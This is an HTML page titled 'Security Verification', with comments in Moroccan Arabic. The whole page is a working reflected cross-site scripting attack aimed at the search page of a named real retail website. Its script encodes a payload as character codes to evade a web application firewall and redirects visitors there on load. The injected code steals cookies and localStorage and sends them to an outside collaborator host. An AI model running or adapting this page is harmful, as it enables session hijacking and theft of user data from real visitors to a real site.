<!DOCTYPE html>
<html>
<head>
    <title>Security Verification</title>
</head>
<body>
    <script>
        // 1. هادا هو الكود اللي خدم ليك فـ Console (نفسه 100%)
        let code = `
            alert("XSS Triggered on: " + document.domain);
            var collab = "https://z66h4nv8uyupc4te2u8dlwqpkgq7ez2o.oastify.com"; 
            var data = btoa(JSON.stringify({
                domain: document.domain,
                cookies: document.cookie,
                localStorage: JSON.stringify(localStorage)
            }));
            fetch(collab + "/?alert_success=" + data, {mode: 'no-cors'});
        `;

        // 2. تحويل الكود لأرقام (Decimal) باش نهربو من الـ WAF
        let charCode = code.split('').map(c => c.charCodeAt(0)).join(',');

        // 3. بناء الرابط باستعمال eval(String.fromCharCode(...))
        // هكا الرابط ما فيه لا < لا > لا ' لا "
        let payload = "</h1></title><svg/onload=eval(String.fromCharCode(" + charCode + "))>";
        
        let target = "https://www.decathlon.com/search?q=" + encodeURIComponent(payload);

        // 4. تنفيذ الهجوم
        window.location.href = target;
    </script>
</body>
</html>
